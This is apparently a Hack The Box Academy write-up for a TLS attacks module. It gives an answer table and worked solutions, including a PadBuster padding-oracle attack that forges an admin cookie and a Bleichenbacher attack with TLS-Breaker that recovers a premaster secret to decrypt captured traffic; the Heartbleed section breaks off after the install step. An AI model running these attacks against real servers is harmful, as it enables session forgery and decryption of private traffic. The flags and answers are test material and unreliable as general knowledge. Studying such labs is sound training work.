| Section | Question Number | Answer |
| --- | --- | --- |
| Public Key Infrastructure | Question 1 | HTB{2f45eaaf0f269e2674bfedbcac0bcb43} |
| TLS 1.2 Handshake | Question 1 | 332 |
| TLS 1.2 Handshake | Question 2 | TLS\_RSA\_WITH\_AES\_128\_CBC\_SHA |
| TLS 1.2 Handshake | Question 3 | 3c375fbd18 |
| TLS 1.3 | Question 1 | 17 |
| TLS 1.3 | Question 2 | TLS\_AES\_128\_GCM\_SHA256 |
| TLS 1.3 | Question 3 | 67c7f3134aac505ed4356c63cd3ec7b16090e9f7b0f64cd9b79d4f28e7118759 |
| Padding Oracles | Question 1 | HTB{b58ca38a09a44a8d18d4d2feeb6004f9} |
| POODLE & BEAST | Question 1 | AABBCCDDEEFF00000000000000000009 |
| Bleichenbacher & DROWN | Question 1 | HTB{23604bcc6a0d34a7824ef9b194798c53} |
| Heartbleed Bug | Question 1 | 2469793123 |
| SSL Stripping | Question 1 | 63072000 |
| Cryptographic Attacks | Question 1 | TLS\_RSA\_EXPORT\_WITH\_DES40\_CBC\_SHA |
| Downgrade Attacks | Question 1 | TLS 1.2 |
| Downgrade Attacks | Question 2 | SSL 3.0 |
| Testing TLS Configuration | Question 1 | T |
| Testing TLS Configuration | Question 2 | 2 |
| Testing TLS Configuration | Question 3 | Heartbleed |
| Skills Assessment | Question 1 | HTB{f0b8ed15026e95ce5b4dbcacab0dbc3d} |

## Acronyms Used in Writeups

| Acronym | Meaning |
| --- | --- |
| STMIP | Spawned Target Machine IP Address |
| STMPO | Spawned Target Machine Port |
| PMVPN | Personal Machine with a Connection to the Academy's VPN |
| PWNIP | Pwnbox IP Address (or PMVPN IP Address) |
| PWNPO | Pwnbox Port (or PMVPN Port) |

# Public Key Infrastructure

## Question 1

### "Download the attached file. It contains the encrypted flag and a key. Decrypt the flag with the key using openssl."

Students first need to download [pki.zip](https://academy.hackthebox.com/storage/modules/184/pki.zip) and then unzip it:

Code: shell

```shell
wget https://academy.hackthebox.com/storage/modules/184/pki.zip && unzip pki.zip
```

```shell
┌─[us-academy-2]─[10.10.14.152]─[htb-ac413848@htb-cnquafq7nq]─[~]
└──╼ [★]$ wget https://academy.hackthebox.com/storage/modules/184/pki.zip && unzip pki.zip

--2023-01-14 07:40:00--  https://academy.hackthebox.com/storage/modules/184/pki.zip
Resolving academy.hackthebox.com (academy.hackthebox.com)... 104.18.21.126, 104.18.20.126, 2606:4700::6812:147e, ...
Connecting to academy.hackthebox.com (academy.hackthebox.com)|104.18.21.126|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1816 (1.8K) [application/zip]
Saving to: ‘pki.zip.1’

pki.zip.1                               100%[=============================================================================>]   1.77K  --.-KB/s    in 0s      

2023-01-14 07:40:00 (11.8 MB/s) - ‘pki.zip.1’ saved [1816/1816]

Archive:  pki.zip
 extracting: flag.enc                
  inflating: rsa.pem
```

Subsequently, students need to use `openssl` to decrypt the file "flag.enc" with the "rsa.pem" private key, attaining the flag `HTB{2f45eaaf0f269e2674bfedbcac0bcb43}`:

Code: shell

```shell
openssl rsautl -decrypt -inkey rsa.pem -in flag.enc
```

```shell
┌─[us-academy-2]─[10.10.14.152]─[htb-ac413848@htb-cnquafq7nq]─[~]
└──╼ [★]$ openssl rsautl -decrypt -inkey rsa.pem -in flag.enc

HTB{2f45eaaf0f269e2674bfedbcac0bcb43}
```

Answer: `HTB{2f45eaaf0f269e2674bfedbcac0bcb43}`

# TLS 1.2 Handshake

## Question 1

### "Download the attached file. Open the pcap file in Wireshark and analyze the TLS 1.2 handshake. Answer the following questions. How many cipher suites are supported by the client?"

Students first need to download [tls12\_handshake.zip](https://academy.hackthebox.com/storage/modules/184/tls12_handshake.zip) and then unzip it:

Code: shell

```shell
wget https://academy.hackthebox.com/storage/modules/184/tls12_handshake.zip && unzip tls12_handshake.zip
```

```shell
┌─[us-academy-2]─[10.10.14.152]─[htb-ac413848@htb-cnquafq7nq]─[~]
└──╼ [★]$ wget https://academy.hackthebox.com/storage/modules/184/tls12_handshake.zip && unzip tls12_handshake.zip

--2023-01-14 08:06:50--  https://academy.hackthebox.com/storage/modules/184/tls12_handshake.zip
Resolving academy.hackthebox.com (academy.hackthebox.com)... 104.18.20.126, 104.18.21.126, 2606:4700::6812:147e, ...
Connecting to academy.hackthebox.com (academy.hackthebox.com)|104.18.20.126|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3457 (3.4K) [application/zip]
Saving to: ‘tls12_handshake.zip’

tls12_handshake.zip                     100%[=============================================================================>]   3.38K  --.-KB/s    in 0s      

2023-01-14 08:06:50 (19.5 MB/s) - ‘tls12_handshake.zip’ saved [3457/3457]

Archive:  tls12_handshake.zip
  inflating: handshake.pcap 
```

Once downloaded, students need to inspect the extracted `pcap` file "handshake.pcap" with `Wireshark` and apply the `tls` filter:

Code: shell

```shell
wireshark handshake.pcap
```

```shell
┌─[us-academy-2]─[10.10.14.152]─[htb-ac413848@htb-cnquafq7nq]─[~]
└──╼ [★]$ wireshark handshake.pcap

08:12:02.332     Main Warn QStandardPaths: XDG_RUNTIME_DIR not set, defaulting to '/tmp/runtime-htb-ac413848'
```

![[HTB Solutions/CWEE/z. images/5fad85e1b2f13475082a43caf3586cc0_MD5.jpg]]

When inspecting the `Client Hello` packet, students will find that the client supports `332` Cipher Suites:

![[HTB Solutions/CWEE/z. images/c8bb7a007f808d7957c6c232843e3ecd_MD5.jpg]]

Answer: `332`

# TLS 1.2 Handshake

## Question 2

### "What cipher suite was agreed upon for the TLS session?"

From the previous `Wireshark` window open, students need to inspect the `Server Hello` packet, to find that the Cipher Suite chosen is `TLS_RSA_WITH_AES_128_CBC_SHA`:

![[HTB Solutions/CWEE/z. images/02122ac3c46899e32829d8c75e7d064f_MD5.jpg]]

Answer: `TLS_RSA_WITH_AES_128_CBC_SHA`

# TLS 1.2 Handshake

## Question 3

### "Provide the first 10 characters of the encrypted premaster secret for the TLS session."

Using the same `Wireshark` window, students need to inspect the `Client Key Exchange` packet, finding that the 10 first characters of the encrypted premaster secret for the TLS session are `3c375fbd18`:

![[HTB Solutions/CWEE/z. images/5cb3baa18225a1eefbe8e8db976897f9_MD5.jpg]]

Answer: `3c375fbd18`

# TLS 1.3

## Question 1

### "Download the attached file. Open the pcap file in Wireshark and analyze the TLS 1.3 handshake. Answer the following questions. How many cipher suites are supported by the client?"

Students first need to download [tls13\_handshake.zip](https://academy.hackthebox.com/storage/modules/184/tls13_handshake.zip) and then unzip it:

Code: bash

```bash
wget https://academy.hackthebox.com/storage/modules/184/tls13_handshake.zip && unzip tls13_handshake.zip
```

```shell
┌─[us-academy-2]─[10.10.14.152]─[htb-ac413848@htb-rcjbpg80cg]─[~]
└──╼ [★]$ wget https://academy.hackthebox.com/storage/modules/184/tls13_handshake.zip && unzip tls13_handshake.zip

--2023-01-14 09:31:02--  https://academy.hackthebox.com/storage/modules/184/tls13_handshake.zip
Resolving academy.hackthebox.com (academy.hackthebox.com)... 104.18.20.126, 104.18.21.126, 2606:4700::6812:147e, ...
Connecting to academy.hackthebox.com (academy.hackthebox.com)|104.18.20.126|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 5754 (5.6K) [application/zip]
Saving to: ‘tls13_handshake.zip.1’

tls13_handshake.zip.1                   100%[=============================================================================>]   5.62K  --.-KB/s    in 0s      

2023-01-14 09:31:02 (29.7 MB/s) - ‘tls13_handshake.zip.1’ saved [5754/5754]

Archive:  tls13_handshake.zip
  inflating: handshake.pcap
```

Once downloaded, students need to inspect the extracted `pcap` file "handshake.pcap" with `Wireshark` and apply the `tls` filter:

Code: shell

```shell
wireshark handshake.pcap
```

```shell
┌─[us-academy-2]─[10.10.14.152]─[htb-ac413848@htb-rcjbpg80cg]─[~]
└──╼ [★]$ wireshark handshake.pcap

09:32:38.926     Main Warn QStandardPaths: XDG_RUNTIME_DIR not set, defaulting to '/tmp/runtime-htb-ac413848'
```

![[HTB Solutions/CWEE/z. images/1f8b5363f832e9014b54d574677c357a_MD5.jpg]]

When inspecting the `Client Hello` packet, students will find that client supports `17` Cipher Suites:

![[HTB Solutions/CWEE/z. images/6915060e11ec6d5a49cfa124a812d39d_MD5.jpg]]

Answer: `17`

# TLS 1.3

## Question 2

### "What cipher suite was agreed upon for the TLS session?"

Using the same `Wireshark` window, students need to inspect the `Server Hello` packet, finding that the Server and Client agreed upon the `TLS_AES_128_GCM_SHA256` Cipher Suite:

![[HTB Solutions/CWEE/z. images/c06ad4173a392aaa7c7f5046c09d17ec_MD5.jpg]]

Answer: `TLS_AES_128_GCM_SHA256`

# TLS 1.3

## Question 3

### "What is the server's key share?"

Using the same `Wireshark` window, students need to inspect the `Server Hello` packet, expand `Extension: key_share` --> `Key Share extension` --> `Key Exchange`, to find that the server's key share is `67c7f3134aac505ed4356c63cd3ec7b16090e9f7b0f64cd9b79d4f28e7118759`:

![[HTB Solutions/CWEE/z. images/98d262e219d158d1a969d46a729b5d11_MD5.jpg]]

Answer: `67c7f3134aac505ed4356c63cd3ec7b16090e9f7b0f64cd9b79d4f28e7118759`

# Padding Oracles

## Question 1

### "Exploit the Padding Oracle to gain access to the admin panel and submit the flag."

After spawning the target machine, students need to visit its root web page and login with the credentials `htb-stdnt:Academy_student!`:

![[HTB Solutions/CWEE/z. images/b365341f47648ce86e68cb66a74990a1_MD5.jpg]]

![[HTB Solutions/CWEE/z. images/8f022d480dec5fef924289669fbe6d8d_MD5.jpg]]

Subsequently, students need to open `Burp Suite` and click on the "Admin" button to intercept the request being sent, noticing the "user" base64-encoded cookie being utilized:

![[HTB Solutions/CWEE/z. images/55b76a417ada2a80e85d8cafd626d555_MD5.jpg]]

![[HTB Solutions/CWEE/z. images/61a227c6d218683618a5c22764626771_MD5.jpg]]

Students need to send the request to `Repeater`, and when altering the cookie's value (to something such as "invalid"), they will notice that the response returns "Invalid Padding":

![[HTB Solutions/CWEE/z. images/913cd942b22cc3d2dc3ad4c90661ebfd_MD5.jpg]]

From the error message returned, students need to use `PadBuster` on the Padding Oracle at the `/admin` endpoint to decrypt the cookie; the block size needs to be set to 8 (if students set it to 16 instead, it will fail with the error "Encrypted Bytes must be evenly divisible by Block Size (16)"), the encoding set to base64 (i.e., `0` in `PadBuster`), the cookie to `user=zIKL+D7dDyxmzxZ8EeIutS81XrGTzWK+/lZuLuDzuZc=`, and the error message to "Invalid Padding", attaining the plaintext `user=htb-stdnt`:

Code: shell

```shell
padbuster http://STMIP:STMPO/admin 'dnAghSVbCLfb5Ndu82BJbQzbr+036y5l' 8 -encoding 0 -cookies "user=dnAghSVbCLfb5Ndu82BJbQzbr+036y5l" -error 'Invalid Padding'
```

```shell
┌─[us-academy-2]─[10.10.14.229]─[htb-ac413848@htb-u7mr54zueo]─[~]
└──╼ [★]$ padbuster http://165.227.231.233:30155/admin 'dnAghSVbCLfb5Ndu82BJbQzbr+036y5l' 8 -encoding 0 -cookies "user=dnAghSVbCLfb5Ndu82BJbQzbr+036y5l" -error 'Invalid Padding'

+-------------------------------------------+
| PadBuster - v0.3.3                        |
| Brian Holyfield - Gotham Digital Science  |
| labs@gdssecurity.com                      |
+-------------------------------------------+

INFO: The original request returned the following
[+] Status: 401
[+] Location: N/A
[+] Content Length: 12

INFO: Starting PadBuster Decrypt Mode
*** Starting Block 1 of 2 ***

[+] Success: (44/256) [Byte 8]
[+] Success: (130/256) [Byte 7]
[+] Success: (208/256) [Byte 6]
[+] Success: (228/256) [Byte 5]
[+] Success: (14/256) [Byte 4]
[+] Success: (189/256) [Byte 3]
[+] Success: (252/256) [Byte 2]
[+] Success: (245/256) [Byte 1]

Block 1 Results:
[+] Cipher Text (HEX): dbe4d76ef360496d
[+] Intermediate Bytes (HEX): 030345f718337cd5
[+] Plain Text: user=htb

Use of uninitialized value $plainTextBytes in concatenation (.) or string at /usr/bin/padbuster line 361.
*** Starting Block 2 of 2 ***

[+] Success: (146/256) [Byte 8]
[+] Success: (183/256) [Byte 7]
[+] Success: (233/256) [Byte 6]
[+] Success: (103/256) [Byte 5]
[+] Success: (241/256) [Byte 4]
[+] Success: (91/256) [Byte 3]
[+] Success: (112/256) [Byte 2]
[+] Success: (2/256) [Byte 1]

Block 2 Results:
[+] Cipher Text (HEX): 0cdbafed37eb2e65
[+] Intermediate Bytes (HEX): f697a30a9d144b6f
[+] Plain Text: -stdnt

-------------------------------------------------------
** Finished ***

[+] Decrypted value (ASCII): user=htb-stdnt

[+] Decrypted value (HEX): 757365723D6874622D7374646E740202

[+] Decrypted value (Base64): dXNlcj1odGItc3RkbnQCAg==

-------------------------------------------------------
```

Subsequently, students need to encrypt the cookie with the value `user=admin` instead of `user=htb-stdnt`, attaining the encrypted cookie value `Ctq8zd%2Bc%2BByGoL%2F%2Bmf0kBwAAAAAAAAAA`:

Code: shell

```shell
padbuster http://STMPO:STMIP/admin 'dnAghSVbCLfb5Ndu82BJbQzbr+036y5l' 8 -encoding 0 -cookies "user=dnAghSVbCLfb5Ndu82BJbQzbr+036y5l" -plaintext "user=admin" -error 'Invalid Padding'
```

```shell
┌─[us-academy-2]─[10.10.14.229]─[htb-ac413848@htb-u7mr54zueo]─[~]
└──╼ [★]$ padbuster http://165.227.231.233:30155/admin 'dnAghSVbCLfb5Ndu82BJbQzbr+036y5l' 8 -encoding 0 -cookies "user=dnAghSVbCLfb5Ndu82BJbQzbr+036y5l" -plaintext "user=admin" -error 'Invalid Padding'

+-------------------------------------------+
| PadBuster - v0.3.3                        |
| Brian Holyfield - Gotham Digital Science  |
| labs@gdssecurity.com                      |
+-------------------------------------------+

INFO: The original request returned the following
[+] Status: 401
[+] Location: N/A
[+] Content Length: 12

INFO: Starting PadBuster Encrypt Mode
[+] Number of Blocks: 2

[+] Success: (256/256) [Byte 8]
[+] Success: (224/256) [Byte 7]
[+] Success: (8/256) [Byte 6]
[+] Success: (101/256) [Byte 5]
[+] Success: (3/256) [Byte 4]
[+] Success: (65/256) [Byte 3]
[+] Success: (55/256) [Byte 2]
[+] Success: (25/256) [Byte 1]

Block 2 Results:
[+] New Cipher Text (HEX): 86a0bffe99fd2407
[+] Intermediate Bytes (HEX): efceb9f89ffb2201

[+] Success: (144/256) [Byte 8]
[+] Success: (98/256) [Byte 7]
[+] Success: (2/256) [Byte 6]
[+] Success: (26/256) [Byte 5]
[+] Success: (70/256) [Byte 4]
[+] Success: (33/256) [Byte 3]
[+] Success: (82/256) [Byte 2]
[+] Success: (137/256) [Byte 1]

Block 1 Results:
[+] New Cipher Text (HEX): 0adabccddf9cf81c
[+] Intermediate Bytes (HEX): 7fa9d9bfe2fd9c71

-------------------------------------------------------
** Finished ***

[+] Encrypted value is: Ctq8zd%2Bc%2BByGoL%2F%2Bmf0kBwAAAAAAAAAA
-------------------------------------------------------
```

At last, students need to use the encrypted value `Ctq8zd%2Bc%2BByGoL%2F%2Bmf0kBwAAAAAAAAAA` for the "user" cookie, attaining the flag `HTB{b58ca38a09a44a8d18d4d2feeb6004f9}`:

![[HTB Solutions/CWEE/z. images/238aa7f28ef261188dee51b87ffa4e62_MD5.jpg]]

Answer: `HTB{b58ca38a09a44a8d18d4d2feeb6004f9}`

# POODLE & BEAST

## Question 1

### "Construct a valid SSL 3.0 padding of the plaintext bytes "AABBCCDDEEFF". Use the byte 00 for any byte that can be an arbitrary value. Provide the padded plaintext without spaces. Assume the cipher suite TLS\_RSA\_WITH\_AES\_128\_CBC\_SHA is used."

Since the block size of `AES` is `16` and the plaintext `AABBCCDDEEFF` is 6 bytes long, students need to add 9 bytes of padding and the padding length itself which is `09`:

```shell
AABBCCDDEEFF00000000000000000009
```

Answer: `AABBCCDDEEFF00000000000000000009`

# Bleichenbacher & DROWN

## Question 1

### "You were able to capture TLS traffic between a client and the target server that you want to decrypt. Execute a Bleichenbacher Attack to obtain the premaster secret. Enter the unpadded premaster secret. Note: The IP address in the pcap file is different so you cannot use the -pcap option. Look at the help of the tool and find a way to pass the encrypted premaster secret to execute the attack. The attack may take up to 60 minutes. In case you have issues, please use the (unpadded) premaster secret provided in the hint."

Students first need to install `TLS-Breaker` (If not installed):

Code: shell

```shell
sudo apt install maven
git clone https://github.com/tls-attacker/TLS-Breaker
cd TLS-Breaker/
mvn clean install -DskipTests=true
```

```shell
┌─[us-academy-2]─[10.10.14.152]─[htb-ac413848@htb-mtjwbdn11t]─[~]
└──╼ [★]$ sudo apt install maven
git clone https://github.com/tls-attacker/TLS-Breaker
cd TLS-Breaker/
mvn clean install -DskipTests=true
Reading package lists... Done
Building dependency tree... Done
Reading state information... Done
The following additional packages will be installed:
  libaopalliance-java libapache-pom-java libatinject-jsr330-api-java libcdi-api-java libcommons-cli-java libcommons-io-java libcommons-lang3-java
  libcommons-parent-java libgeronimo-annotation-1.3-spec-java libgeronimo-interceptor-3.0-spec-java 
<SNIP>
```

Students will verify the installation of `Java` and its directory on the workstation due to the requirement of [TLS-Breaker](https://github.com/tls-attacker/TLS-Breaker/wiki/1.-TLS_Breaker-Configuration) as it expects `JDK 11`, the `java` binary would be located in the subsequent `bin/` directory of `/usr/lib/jvm/java-1.11.0-openjdk-amd64`:

Code: shell

```shell
update-java-alternatives --list
```

```shell
┌─[eu-academy-6]─[10.10.14.74]─[htb-ac-8414@htb-napubisaxw]─[~]
└──╼ [★]$ update-java-alternatives --list

java-1.11.0-openjdk-amd64      1111       /usr/lib/jvm/java-1.11.0-openjdk-amd64
java-1.17.0-openjdk-amd64      1711       /usr/lib/jvm/java-1.17.0-openjdk-amd64
```

Subsequently, students need to download [bleichenbacher.zip](https://academy.hackthebox.com/storage/modules/184/bleichenbacher.zip) and then unzip it:

Code: shell

```shell
wget https://academy.hackthebox.com/storage/modules/184/bleichenbacher.zip && unzip bleichenbacher.zip
```

```shell
┌─[us-academy-2]─[10.10.14.152]─[htb-ac413848@htb-mtjwbdn11t]─[~/TLS-Breaker]
└──╼ [★]$ wget https://academy.hackthebox.com/storage/modules/184/bleichenbacher.zip && unzip bleichenbacher.zip

--2023-01-16 07:03:18--  https://academy.hackthebox.com/storage/modules/184/bleichenbacher.zip
Resolving academy.hackthebox.com (academy.hackthebox.com)... 104.18.20.126, 104.18.21.126, 2606:4700::6812:157e, ...
Connecting to academy.hackthebox.com (academy.hackthebox.com)|104.18.20.126|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 4126 (4.0K) [application/zip]
Saving to: ‘bleichenbacher.zip’

bleichenbacher.zip                      100%[=============================================================================>]   4.03K  --.-KB/s    in 0s      

2023-01-16 07:03:18 (19.3 MB/s) - ‘bleichenbacher.zip’ saved [4126/4126]

Archive:  bleichenbacher.zip
  inflating: traffic.pcap
```

Once downloaded, students need to inspect the extracted `pcap` file "traffic.pcap" with `Wireshark` and apply the `tls` filter:

Code: shell

```shell
wireshark traffic.pcacp
```

```shell
┌─[us-academy-2]─[10.10.14.152]─[htb-ac413848@htb-mtjwbdn11t]─[~/TLS-Breaker]
└──╼ [★]$ wireshark traffic.pcap

07:09:05.250     Main Warn QStandardPaths: XDG_RUNTIME_DIR not set, defaulting to '/tmp/runtime-htb-ac413848'
```

![[HTB Solutions/CWEE/z. images/d2d1edc92f5e51f235ea82650ef86588_MD5.jpg]]

Students need to extract the encrypted premaster secret from the `Client Key Exchange` packet:

```shell
a3670d3a2635d0bd058f7b3e838bd45db2af554f69f66345232960ad98392faaf2e873f818b18c85d0c4cc332b20e30ebe230f0cd77674d62d49cc90857d7695d41f9589546d7eb0ad34ac9c7fd3eafaa2967db2dcab25680185e9f129a637a3024df61f009cb8c1d0394fdf758bdf4becf04685533186cbaf503917cb0fbf88841d8497bef6af3c4e6ae2c8ed01cc1727a4356734aafb811771dcd17842e118e706c67c53f16b9268afd0183e2ba449985bc6d78bbc728591a4bafb4280c58102c90809fb0550e7d1700c795eb615238a80f466547711416c2b154fb1ee2c4cb3b97b956a01871a4753856cdafe8ef31a539fb87c98095e2c7a3aae990c3953
```

![[HTB Solutions/CWEE/z. images/c7e062612a629c460f774876272b5dc6_MD5.jpg]]

Subsequently, students need to run `bleichenbacher-1.0.1.jar` against the spawned target machine and feed the encrypted premaster secret with the option `-encrypted_premaster_secret`, yielding out the padded premaster secret key (this attack might take a considerable amount of time):

Code: shell

```shell
/usr/lib/jvm/java-1.11.0-openjdk-amd64/bin/java -jar apps/bleichenbacher-1.0.1.jar -executeAttack -connect STMIP:STMPO -encrypted_premaster_secret a3670d3a2635d0bd058f7b3e838bd45db2af554f69f66345232960ad98392faaf2e873f818b18c85d0c4cc332b20e30ebe230f0cd77674d62d49cc90857d7695d41f9589546d7eb0ad34ac9c7fd3eafaa2967db2dcab25680185e9f129a637a3024df61f009cb8c1d0394fdf758bdf4becf04685533186cbaf503917cb0fbf88841d8497bef6af3c4e6ae2c8ed01cc1727a4356734aafb811771dcd17842e118e706c67c53f16b9268afd0183e2ba449985bc6d78bbc728591a4bafb4280c58102c90809fb0550e7d1700c795eb615238a80f466547711416c2b154fb1ee2c4cb3b97b956a01871a4753856cdafe8ef31a539fb87c98095e2c7a3aae990c3953
```

```shell
┌─[us-academy-2]─[10.10.14.152]─[htb-ac413848@htb-lsvhwlynig]─[~/TLS-Breaker]
└──╼ [★]$ /usr/lib/jvm/java-1.11.0-openjdk-amd64/bin/java -jar apps/bleichenbacher-1.0.1.jar -executeAttack -connect 165.227.231.233:31118 -encrypted_premaster_secret a3670d3a2635d0bd058f7b3e838bd45db2af554f69f66345232960ad98392faaf2e873f818b18c85d0c4cc332b20e30ebe230f0cd77674d62d49cc90857d7695d41f9589546d7eb0ad34ac9c7fd3eafaa2967db2dcab25680185e9f129a637a3024df61f009cb8c1d0394fdf758bdf4becf04685533186cbaf503917cb0fbf88841d8497bef6af3c4e6ae2c8ed01cc1727a4356734aafb811771dcd17842e118e706c67c53f16b9268afd0183e2ba449985bc6d78bbc728591a4bafb4280c58102c90809fb0550e7d1700c795eb615238a80f466547711416c2b154fb1ee2c4cb3b97b956a01871a4753856cdafe8ef31a539fb87c98095e2c7a3aae990c3953

09:00:22 [main] INFO : ClientTcpTransportHandler - Connection established from ports 36522 -> 31118
09:00:22 [main] INFO : BleichenbacherAttacker - Using the following oracle type: CKE_CCS_FIN
A server is considered vulnerable to this attack if it responds differently to the test vectors.
A server is considered secure if it always responds the same way.
09:00:23 [main] INFO : WorkflowExecutor - Connecting to 165.227.231.233:31118

<SNIP>

09:26:36 [main] INFO : GenericReceiveAction - Received Messages (TlsContext{'client', connected to 165.227.231.233:31118}): Alert(FATAL,BAD_RECORD_MAC), 
09:26:36 [main] INFO : Bleichenbacher - Step 3: Narrowing the set of solutions.
09:26:36 [main] INFO : Bleichenbacher - Step 4: Computing the solution.
09:26:36 [main] INFO : Bleichenbacher - ====> Solution found!
 
02 C3 AB F8 D5 43 12 E4  24 46 36 4D 8E 59 BD 12
36 AE C1 F6 2C CF FF FA  2C A0 65 55 CD 49 A5 5D
29 59 47 A1 3C 5E B2 88  62 5C B1 08 94 FE 27 5B
43 61 9C F8 29 42 28 49  CA 60 5E 1A 42 47 AF DF
67 77 12 54 66 FB 11 91  2A F0 99 E9 DC 45 74 93
06 02 F1 36 44 40 D6 EB  4F DA D4 65 EE E1 41 43
A6 42 B6 4D 41 16 B4 0C  FC B8 DB 20 2D 2B A8 66
80 38 CE 2F 20 68 CF 06  CE 8D 1F 23 AC 29 4C 3B
02 9C 36 04 16 24 F2 B0  2A 9A 43 41 44 B0 1B F4
E3 89 B4 E7 48 4E FB 68  C0 58 D4 24 06 73 EE 6B
D1 9F B5 F8 0C 3D 08 48  6B 88 8C FA 82 35 D5 F2
E1 AB 4C AE 3D 26 65 33  B9 90 C6 AB BC BE EA 25
B6 0C 8D BE 5D B4 AF 37  90 D7 5B 67 95 6E 00 03
03 46 E3 1F E2 7A 7E F6  2F 88 82 6F 00 D9 5C 3E
86 65 D8 AC 71 96 14 36  95 43 B0 77 EC AC 37 C1
12 E1 31 3C FA 8E CF 9F  B8 6C 29 ED 89 AB C4
09:26:36 [main] INFO : Bleichenbacher - // Total # of queries so far: 19307
2c3abf8d54312e42446364d8e59bd1236aec1f62ccffffa2ca06555cd49a55d295947a13c5eb288625cb10894fe275b43619cf829422849ca605e1a4247afdf6777125466fb11912af099e9dc4574930602f1364440d6eb4fdad465eee14143a642b64d4116b40cfcb8db202d2ba8668038ce2f2068cf06ce8d1f23ac294c3b029c36041624f2b02a9a434144b01bf4e389b4e7484efb68c058d4240673ee6bd19fb5f80c3d08486b888cfa8235d5f2e1ab4cae3d266533b990c6abbcbeea25b60c8dbe5db4af3790d75b67956e00030346e31fe27a7ef62f88826f00d95c3e8665d8ac719614369543b077ecac37c112e1313cfa8ecf9fb86c29ed89abc4
```

Students then need to remove the padding from the premaster secret key, to attain the unpadded one `030346e31fe27a7ef62f88826f00d95c3e8665d8ac719614369543b077ecac37c112e1313cfa8ecf9fb86c29ed89abc4`:

Code: shell

```shell
echo -n 2c3abf8d54312e42446364d8e59bd1236aec1f62ccffffa2ca06555cd49a55d295947a13c5eb288625cb10894fe275b43619cf829422849ca605e1a4247afdf6777125466fb11912af099e9dc4574930602f1364440d6eb4fdad465eee14143a642b64d4116b40cfcb8db202d2ba8668038ce2f2068cf06ce8d1f23ac294c3b029c36041624f2b02a9a434144b01bf4e389b4e7484efb68c058d4240673ee6bd19fb5f80c3d08486b888cfa8235d5f2e1ab4cae3d266533b990c6abbcbeea25b60c8dbe5db4af3790d75b67956e00030346e31fe27a7ef62f88826f00d95c3e8665d8ac719614369543b077ecac37c112e1313cfa8ecf9fb86c29ed89abc4 | awk -F '0303' '{print "\n0303"$2}'
```

```shell
┌─[us-academy-2]─[10.10.14.152]─[htb-ac413848@htb-lsvhwlynig]─[~]
└──╼ [★]$ echo -n 2c3abf8d54312e42446364d8e59bd1236aec1f62ccffffa2ca06555cd49a55d295947a13c5eb288625cb10894fe275b43619cf829422849ca605e1a4247afdf6777125466fb11912af099e9dc4574930602f1364440d6eb4fdad465eee14143a642b64d4116b40cfcb8db202d2ba8668038ce2f2068cf06ce8d1f23ac294c3b029c36041624f2b02a9a434144b01bf4e389b4e7484efb68c058d4240673ee6bd19fb5f80c3d08486b888cfa8235d5f2e1ab4cae3d266533b990c6abbcbeea25b60c8dbe5db4af3790d75b67956e00030346e31fe27a7ef62f88826f00d95c3e8665d8ac719614369543b077ecac37c112e1313cfa8ecf9fb86c29ed89abc4 | awk -F '0303' '{print "\n0303"$2}'

030346e31fe27a7ef62f88826f00d95c3e8665d8ac719614369543b077ecac37c112e1313cfa8ecf9fb86c29ed89abc4
```

Answer: `030346e31fe27a7ef62f88826f00d95c3e8665d8ac719614369543b077ecac37c112e1313cfa8ecf9fb86c29ed89abc4`

# Bleichenbacher & DROWN

## Question 2

### "Solve the exercise below or reveal the answer to obtain the premaster secret. Use it to decrypt the traffic in the attached file. What is the flag?"

After obtaining the premaster secret from the previous question, students need to decrypt the entire communication that is in the "traffic.pcap" file, to do so, students first need to extract the client's random key, `9443e40e20140ebf9e3c83f268f73f8de9c564f9eb493c8f6ad7bfe1ddf672bc`, which can be found in the `ClientHello` packet in the `Random` field:

![[HTB Solutions/CWEE/z. images/d1cb1c1197dac75bc4d4d423b66d9bf4_MD5.jpg]]

Subsequently, students need to create a key file for `Wireshark`, which has the format:

```shell
PMS_CLIENT_RANDOM <CLIENT_RANDOM> <PREMASTER_SECRET>
```

The final key file with the previously attained variables is:

```shell
PMS_CLIENT_RANDOM 9443e40e20140ebf9e3c83f268f73f8de9c564f9eb493c8f6ad7bfe1ddf672bc 030346e31fe27a7ef62f88826f00d95c3e8665d8ac719614369543b077ecac37c112e1313cfa8ecf9fb86c29ed89abc4
```

To save it to a file, students can use `cat`:

Code: shell

```shell
cat << EOF > KeyFile
PMS_CLIENT_RANDOM 9443e40e20140ebf9e3c83f268f73f8de9c564f9eb493c8f6ad7bfe1ddf672bc 030346e31fe27a7ef62f88826f00d95c3e8665d8ac719614369543b077ecac37c112e1313cfa8ecf9fb86c29ed89abc4
EOF
```

```shell
┌─[us-academy-2]─[10.10.14.165]─[htb-ac413848@htb-sfzdlyu0gb]─[~]
└──╼ [★]$ cat << EOF > KeyFile
> PMS_CLIENT_RANDOM 9443e40e20140ebf9e3c83f268f73f8de9c564f9eb493c8f6ad7bfe1ddf672bc 030346e31fe27a7ef62f88826f00d95c3e8665d8ac719614369543b077ecac37c112e1313cfa8ecf9fb86c29ed89abc4
> EOF
```

Thereafter, students need to import the key file within `Wireshark` by clicking on `Edit` --> `Preferences` --> `Protocols` --> `TLS`:

![[HTB Solutions/CWEE/z. images/68fc1f8f2bf12cc45c0c609026ad8ed2_MD5.jpg]]

Within the `TLS` tab, students need to click on `Browse` for `(Pre)-Master-Secret log filename` and select the decryption key file:

![[HTB Solutions/CWEE/z. images/d22add4b19402a7fd37babd71a0e089f_MD5.jpg]]

![[HTB Solutions/CWEE/z. images/a03911fa631983f78c39d8c62db74723_MD5.jpg]]

Students will notice that the encrypted packets have been decrypted to their original HTTP protocol, therefore, they need to follow the HTTP stream of the second HTTP packet, to attain the flag `HTB{23604bcc6a0d34a7824ef9b194798c53}`:

![[HTB Solutions/CWEE/z. images/cee987963a038c57a7e38c0de031fc79_MD5.jpg]]

![[HTB Solutions/CWEE/z. images/4382e3435ec63129ee194d7cf7cd1f6a_MD5.jpg]]

Answer: `HTB{23604bcc6a0d34a7824ef9b194798c53}`

# Heartbleed Bug

## Question 1

### "Exploit the Heartbleed bug to obtain the server's private key. Submit the first 10 digits of d."

After spawning the target machine, students need to install `TLS-Breaker` (if not already installed):

Code: shell

```shell
sudo apt install maven
git clone https://github.com/tls-attacker/TLS-Breaker
cd TLS-Breaker/
mvn clean install -DskipTests=true
```

Code: sesion

```shell
